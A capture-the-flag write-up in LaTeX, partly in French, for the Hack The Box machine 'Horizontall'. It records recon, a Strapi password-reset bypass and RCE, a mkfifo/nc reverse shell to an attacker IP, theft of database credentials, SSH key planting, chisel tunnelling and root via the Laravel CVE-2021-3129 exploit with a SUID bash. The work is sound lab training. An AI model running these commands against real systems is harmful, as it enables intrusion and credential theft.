\chapter{Horizontall}
\begin{itemize}
    \item {\bf technics}: laravel RCE
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}

\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
22,80
$ sudo nmap -sVC -p$PORTS $TARGET_IP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsection{vhosts enum}

\begin{verbatim}
$ ffuf -u http://10.10.11.105 -H 'Host: FUZZ.horizontall.htb' -w Discovery/DNS/dns-Jhaddix.txt -fs 194

api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 80ms]
\end{verbatim}


\section{api.horizontall.htb}

\subsubsection{fingerprint}
\begin{verbatim}
$ curl -i http://api-prod.horizontall.htb
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 02 Jan 2023 03:33:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 413
Connection: keep-alive
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Last-Modified: Wed, 02 Jun 2021 20:00:29 GMT
Cache-Control: max-age=60
X-Powered-By: Strapi <strapi.io>
\end{verbatim}


\begin{verbatim}
$ ffuf -u http://api-prod.horizontall.htb/FUZZ -w Discovery/Web-Content/common.txt

ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 64ms]
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 87ms]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 155ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 68ms]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 73ms]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4, Duration: 75ms]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1, Duration: 232ms]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1, Duration: 81ms]
:: Progress: [4713/4713] :: Job [1/1] :: 1155 req/sec :: Duration: [0:00:07] :: Errors: 0 ::

$ ffuf -u http://api-prod.horizontall.htb/admin/FUZZ -w Discovery/Web-Content/common.txt -fs 854

init                    [Status: 200, Size: 144, Words: 1, Lines: 1, Duration: 39ms]
layout                  [Status: 200, Size: 90, Words: 1, Lines: 1, Duration: 51ms]
plugins                 [Status: 403, Size: 60, Words: 1, Lines: 1, Duration: 164ms]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4, Duration: 45ms]

$ curl -s http://api-prod.horizontall.htb/admin/init | jq
{
  "data": {
    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
    "currentEnvironment": "development",
    "autoReload": false,
    "strapiVersion": "3.0.0-beta.17.4"
  }
}

$ searchsploit strapi
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)         | multiple/webapps/50238.py
Strapi 3.0.0-beta - Set Password (Unauthenticated)                           | multiple/webapps/50237.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)   | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)     | nodejs/webapps/50716.rb
----------------------------------------------------------------------------- ---------------------------------

$ searchsploit -m 50239


$ curl -X POST http://api-prod.horizontall.htb/admin/auth/reset-passwordi\
    -H 'Content-Type: application/json' \
    -d '{"code": {"$gt":0}, "password": "password123", "passwordConfirmation" : "password123"}'
{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjcyNjM3NDMyLCJleHAiOjE2NzUyMjk0MzJ9.hyUJe9lE4CzwzaOijQMqyMjU2Lnpf8t3kjJohnBivQw","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}

$ python 50239.py  http://api-prod.horizontall.htb
.. .SNIP. ..
$> ping -c 2 10.10.16.2
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:10:46.632114 IP horizontall.htb > honbu: ICMP echo request, id 7917, seq 1, length 64
07:10:46.632176 IP honbu > horizontall.htb: ICMP echo reply, id 7917, seq 1, length 64
07:10:47.633644 IP horizontall.htb > honbu: ICMP echo request, id 7917, seq 2, length 64
07:10:47.633701 IP honbu > horizontall.htb: ICMP echo reply, id 7917, seq 2, length 64


\end{verbatim}


\section{Foothold}
\subsubsection{strapi}
\begin{verbatim}
$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.2 4444 >/tmp/f
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.105 41070
sh: 0: can't access tty; job control turned off
$
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:

/opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
\end{verbatim}

\subsubsection{MySQL}
\begin{verbatim}
$ mysql -u developer -p'#J!:F9Zt2u' -h localhost
mysql -u developer -p'#J!:F9Zt2u' -h localhost
mysql>
\end{verbatim}

\subsubsection{http:8000}

grace a linpeas on a un truc qui ecoute en 8000:
\begin{verbatim}
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1872/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -


$ curl -is http://127.0.0.1:8000
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date: Tue, 03 Jan 2023 01:26:11 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Tue, 03 Jan 2023 01:26:11 GMT
.. .SNIP. ..
                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
\end{verbatim}
Deux solutions:

on peut creer des cles ssh pour se connecter puisque l'on a un vrai user avec
un shell et un home puis faire un port forward
\begin{verbatim}
ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (): ./id_ed25519

strapi@horizontall:~/myapi$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFn/Daf4fqseHvomqnECVLHjgs1S4e+9zee+RtYbBKXd f@u" > .ssh/authorized_keys

$ ssh -i id_rsa -L 4445:localhost:8000 strapi@horizontall.htb
$ curl -I http://localhost:4445
HTTP/1.1 200 OK
Host: localhost:4445
Date: Tue, 03 Jan 2023 02:22:35 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Tue, 03 Jan 2023 02:22:35 GMT

\end{verbatim}



ou on peut utiliser chisel
\begin{verbatim}
$ chisel server -p 9999 --reverse
2023/01/03 02:38:56 server: Reverse tunnelling enabled
2023/01/03 02:38:56 server: Fingerprint jjMtdLyYFO/BFEiecpKvC/QWaMmbKqNmvBoQx12pJaw=
2023/01/03 02:38:56 server: Listening on http://0.0.0.0:9999
2023/01/03 02:39:03 server: session#1: Client version (1.7.7) differs from server version (v1.7.7)
2023/01/03 02:39:03 server: session#1: tun: proxy#R:4445=>8000: Listening
2023/01/03 02:39:04 server: session#2: Client version (1.7.7) differs from server version (v1.7.7)
#
# ON TARGET
#
$ ./chisel client 10.10.16.2:9999 R:4445:127.0.0.1:8000
2023/01/03 01:39:03 client: Connecting to ws://10.10.16.2:9999
2023/01/03 01:39:03 client: Connected (Latency 27.145259ms)

$ curl -I  http://127.0.0.1:4445
HTTP/1.1 200 OK
Host: 127.0.0.1:4445
Date: Tue, 03 Jan 2023 01:44:09 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Tue, 03 Jan 2023 01:44:09 GMT
\end{verbatim}


\url{https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel}

\url{https://github.com/ambionics/laravel-exploits}

\url{https://github.com/nth347/CVE-2021-3129_exploit}

\begin{verbatim}
$ ./exploit.py http://localhost:4445 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 3362, done.
remote: Counting objects: 100% (909/909), done.
remote: Compressing objects: 100% (391/391), done.
remote: Total 3362 (delta 549), reused 731 (delta 472), pack-reused 2453
Receiving objects: 100% (3362/3362), 497.08 KiB | 4.25 MiB/s, done.
Resolving deltas: 100% (1420/1420), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
$ ./exploit.py http://localhost:4445 Monolog/RCE1 'chmod 4755 /bin/bash'
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[i] There is no output
[i] Trying to clear logs
[+] Logs cleared

strapi@horizontall:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
$ bash -p
bash-4.4# id
uid=1001(strapi) gid=1001(strapi) euid=0(root) groups=1001(strapi)
\end{verbatim}

\section{Theorie}


